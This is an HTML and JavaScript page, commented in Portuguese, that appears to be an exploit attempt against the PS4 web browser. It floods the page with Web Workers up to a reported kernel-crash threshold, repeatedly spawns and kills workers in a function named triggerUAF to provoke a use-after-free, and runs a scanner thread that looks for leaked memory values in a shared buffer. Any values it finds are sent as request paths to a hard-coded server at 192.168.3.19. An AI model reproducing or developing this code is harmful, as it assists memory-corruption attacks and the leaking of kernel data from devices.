<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 LIVE MONITOR (SCAN @ 400)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 1px solid #0f0; padding: 20px; margin: 20px 0; background: #111; }
        .critical { color: #f00; border-color: #f00 !important; animation: shake 0.5s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
    </style>
</head>
<body>

    <h1>LIVE MEMORY MONITOR</h1>
    <div id="status">INICIALIZANDO...</div>

    <script>
        // --- CONFIGURAÇÃO IGUAL AO ANTERIOR ---
        const SERVER_IP = "192.168.3.19"; 
        const SERVER_PORT = "8000";

        // GATILHOS
        const SCAN_START_AT = 380; // Começa a escanear ANTES do crash
        const CRASH_ZONE_AT = 400; // Onde você disse que o panic ocorre
        const MAX_THREADS = 425;   // Teto máximo

        const STRUCT_SIZE = 128; // 512 bytes
        const PATTERN = 0xCAFEBABE;

        // Memória Compartilhada (Crucial para velocidade)
        const sharedBuffer = new SharedArrayBuffer(STRUCT_SIZE * 4);
        const sensorArray = new Uint32Array(sharedBuffer);
        
        let workers = [];
        
        // --- WORKER SCANNER (O "OLHO") ---
        // Fica rodando em loop infinito em outra thread, vigiando a memória
        const scannerBlob = new Blob([`
            onmessage = function(e) {
                const arr = new Uint32Array(e.data.buffer);
                const ip = e.data.ip;
                const port = e.data.port;
                const pattern = e.data.pattern;
                
                // Função de envio rápido
                function send(msg) {
                    try { fetch("http://" + ip + ":" + port + "/" + msg, {mode: 'no-cors'}).catch(()=>{}); } catch(z){}
                }

                send("SCANNER_ATIVO_AGUARDANDO_DADOS");

                // Loop Frenético
                setInterval(() => {
                    // Verifica se o Kernel escreveu no nosso array
                    // Checa o começo, meio e fim para ser rápido
                    for(let i=0; i < arr.length; i++) {
                        if(arr[i] !== 0 && arr[i] !== pattern && arr[i] !== 0x11111111 && arr[i] !== 0x99999999) {
                            // ACHOU!
                            const val = arr[i] >>> 0;
                            const hex = val.toString(16).padStart(8, '0');
                            
                            // Envia múltiplos pacotes para garantir
                            send("LEAK_OFFSET_" + (i*4) + "_VAL_" + hex);
                            
                            // Se achamos um ponteiro, tente pegar o vizinho (high bytes)
                            if(i+1 < arr.length) {
                                send("NEXT_VAL_" + (arr[i+1]>>>0).toString(16));
                            }
                        }
                    }
                }, 5); // Verifica a cada 5ms (200x por segundo)
            }
        `], {type:'text/javascript'});
        const scannerUrl = URL.createObjectURL(scannerBlob);


        // --- WORKER DE CARGA (THREADS) ---
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function start() {
            // Prepara o sensor
            sensorArray.fill(PATTERN);
            sensorArray[0] = 0x11111111; 
            sensorArray[STRUCT_SIZE-1] = 0x99999999;

            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nSUBINDO...`;
            logToAndroid("INICIO_LIVE_MONITOR");

            runProcess();
        }

        function runProcess() {
            let scannerStarted = false;

            let i = setInterval(() => {
                // Adiciona Workers
                if (workers.length < MAX_THREADS) {
                    workers.push(new Worker(url));
                    
                    const count = workers.length;

                    // FASE 1: ATIVAR SCANNER (Aos 380)
                    if (count >= SCAN_START_AT && !scannerStarted) {
                        scannerStarted = true;
                        startScannerWorker();
                        document.getElementById('status').innerText = `SCANNER LIGADO! (${count} Threads)`;
                        document.getElementById('status').style.color = "#ff0";
                        logToAndroid("SCANNER_STARTED");
                    }

                    // FASE 2: ZONA DE PERIGO (Aos 400 - Onde Crasha)
                    if (count >= CRASH_ZONE_AT) {
                        document.getElementById('status').className = "critical";
                        document.getElementById('status').innerText = `CRITICAL ZONE: ${count}\nAGUARDANDO CRASH...`;
                        
                        // Aqui fazemos a "Dança da Morte":
                        // Matamos uma thread antiga para abrir espaço para o Kernel escrever
                        // Enquanto o scanner (já ligado) tenta ler.
                        if (count % 2 === 0) { // A cada 2 threads novas, mata uma antiga
                             triggerUAF();
                        }
                    } else {
                        // Atualização visual normal
                        if(count % 20 === 0) document.getElementById('status').innerText = `THREADS: ${count}...`;
                    }

                } else {
                    clearInterval(i);
                }
            }, 30); // Velocidade de subida
        }

        function startScannerWorker() {
            const s = new Worker(scannerUrl);
            s.postMessage({
                buffer: sharedBuffer,
                ip: SERVER_IP,
                port: SERVER_PORT,
                pattern: PATTERN
            });
        }

        function triggerUAF() {
            // Tenta abrir um buraco na memória
            const w = new Worker(killerUrl);
            w.terminate();
            
            // Força nosso buffer compartilhado para o buraco
            // Como é SharedArrayBuffer, o Scanner vê a mudança instantaneamente
            try {
                // Truque de alocação
                let junk = new Uint32Array(sharedBuffer);
            } catch(e){}
        }

        function logToAndroid(data) {
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
